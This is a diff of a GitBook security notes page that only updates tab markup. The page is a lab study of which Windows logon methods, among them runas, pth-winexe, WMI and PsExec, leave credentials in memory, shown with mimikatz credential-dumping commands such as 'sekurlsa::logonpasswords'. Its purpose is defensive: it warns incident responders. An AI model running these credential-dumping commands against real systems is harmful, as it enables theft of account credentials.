@@ -12,14 +12,14 @@ Tested against Microsoft Windows 7 Professional 6.1.7601 Service Pack 1 Build 76
 
 Let's make a base password dump using mimikatz on the victim system to see what we can get before we start logging on to it using other methods such as runas, psexec, etc. To test this, the victim system was rebooted and no other attempts to login to the system were made except for the interactive logon to get access to the console:
 
-{% code-tabs %}
-{% code-tabs-item title="attacker@victim" %}
+{% tabs %}
+{% tab title="attacker@victim" %}
 ```csharp
 mimikatz # privilege::debug
 mimikatz # sekurlsa::logonpasswords
 ```
-{% endcode-tabs-item %}
-{% endcode-tabs %}
+{% endtab %}
+{% endtabs %}
 
 Credentials were cached and got dumped by mimikatz:
 
@@ -27,21 +27,21 @@ Credentials were cached and got dumped by mimikatz:
 
 ## Interactive Logon \(2\) via runas and Local Account
 
-{% code-tabs %}
-{% code-tabs-item title="responder@victim" %}
+{% tabs %}
+{% tab title="responder@victim" %}
 ```csharp
 runas /user:low cmd
 ```
-{% endcode-tabs-item %}
-{% endcode-tabs %}
+{% endtab %}
+{% endtabs %}
 
-{% code-tabs %}
-{% code-tabs-item title="attacker@victim" %}
+{% tabs %}
+{% tab title="attacker@victim" %}
 ```csharp
 mimikatz # sekurlsa::logonpasswords
 ```
-{% endcode-tabs-item %}
-{% endcode-tabs %}
+{% endtab %}
+{% endtabs %}
 
 Credentials were cached and got dumped by mimikatz:
 
@@ -49,21 +49,21 @@ Credentials were cached and got dumped by mimikatz:
 
 ## Interactive Logon \(2\) via runas and Domain Account
 
-{% code-tabs %}
-{% code-tabs-item title="responder@victim" %}
+{% tabs %}
+{% tab title="responder@victim" %}
 ```csharp
 runas /user:spot@offense cmd
 ```
-{% endcode-tabs-item %}
-{% endcode-tabs %}
+{% endtab %}
+{% endtabs %}
 
-{% code-tabs %}
-{% code-tabs-item title="attacker@victim" %}
+{% tabs %}
+{% tab title="attacker@victim" %}
 ```csharp
 mimikatz # sekurlsa::logonpasswords
 ```
-{% endcode-tabs-item %}
-{% endcode-tabs %}
+{% endtab %}
+{% endtabs %}
 
 Credentials were cached and got dumped by mimikatz:
 
@@ -87,21 +87,21 @@ Logon type 9 means that the any network connections originating from our new pro
 
 Imagine an Incident Responder is connecting to a victim system using that machine's local account remotely to inspect it for a compromise using pth-winexe:
 
-{% code-tabs %}
-{% code-tabs-item title="responder@victim" %}
+{% tabs %}
+{% tab title="responder@victim" %}
 ```csharp
 root@~# pth-winexe //10.0.0.2 -U back%password cmd
 ```
-{% endcode-tabs-item %}
-{% endcode-tabs %}
+{% endtab %}
+{% endtabs %}
 
-{% code-tabs %}
-{% code-tabs-item title="attacker@victim" %}
+{% tabs %}
+{% tab title="attacker@victim" %}
 ```text
 sekurlsa::logonpasswords
 ```
-{% endcode-tabs-item %}
-{% endcode-tabs %}
+{% endtab %}
+{% endtabs %}
 
 Mimikatz shows no credentials got stored in memory for the user `back`.
 
@@ -109,16 +109,16 @@ Mimikatz shows no credentials got stored in memory for the user `back`.
 
 Imagine an Incident Responder is connecting to a victim system using a privileged domain account remotely to inspect it for a compromise using pth-winexe, a simple SMB mount or WMI:
 
-{% code-tabs %}
-{% code-tabs-item title="responder@victim" %}
+{% tabs %}
+{% tab title="responder@victim" %}
 ```csharp
 root@~# pth-winexe //10.0.0.2 -U offense/spot%password cmd
 ```
-{% endcode-tabs-item %}
-{% endcode-tabs %}
+{% endtab %}
+{% endtabs %}
 
-{% code-tabs %}
-{% code-tabs-item title="responder@victim" %}
+{% tabs %}
+{% tab title="responder@victim" %}
 ```text
 PS C:\Users\spot> net use * \\10.0.0.2\test /user:offense\spotless spotless
 Drive Z: is now connected to \\10.0.0.2\test.
@@ -131,16 +131,16 @@ Enter the password :********
 Executing (Win32_Process)->Create()
 Method execution successful.
 ```
-{% endcode-tabs-item %}
-{% endcode-tabs %}
+{% endtab %}
+{% endtabs %}
 
-{% code-tabs %}
-{% code-tabs-item title="attacker@victim" %}
+{% tabs %}
+{% tab title="attacker@victim" %}
 ```text
 sekurlsa::logonpasswords
 ```
-{% endcode-tabs-item %}
-{% endcode-tabs %}
+{% endtab %}
+{% endtabs %}
 
 Mimikatz shows no credentials got stored in memory for `offense\spotless` or `offense\administrator`.
 
@@ -160,8 +160,8 @@ Note that any remote logon with a graphical UI is logged as logon event type 10 
 
 ## PsExec From An Elevated Prompt
 
-{% code-tabs %}
-{% code-tabs-item title="responder@victim" %}
+{% tabs %}
+{% tab title="responder@victim" %}
 ```csharp
 .\PsExec64.exe \\10.0.0.2 cmd
 
@@ -174,8 +174,8 @@ Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
 
 C:\Windows\system32>
 ```
-{% endcode-tabs-item %}
-{% endcode-tabs %}
+{% endtab %}
+{% endtabs %}
 
 ![](../../.gitbook/assets/pwdump-psexec-no-atlernate-credentials.png)
 
@@ -185,13 +185,13 @@ Note how all the logon events are of type 3 - network logons and read on to the 
 
 ## PsExec + Alternate Credentials
 
-{% code-tabs %}
-{% code-tabs-item title="responder@victim" %}
+{% tabs %}
+{% tab title="responder@victim" %}
 ```csharp
 .\PsExec64.exe \\10.0.0.2 -u offense\spot -p password cmd
 ```
-{% endcode-tabs-item %}
-{% endcode-tabs %}
+{% endtab %}
+{% endtabs %}
 
 Credentials were cached and got dumped by mimikatz:
 
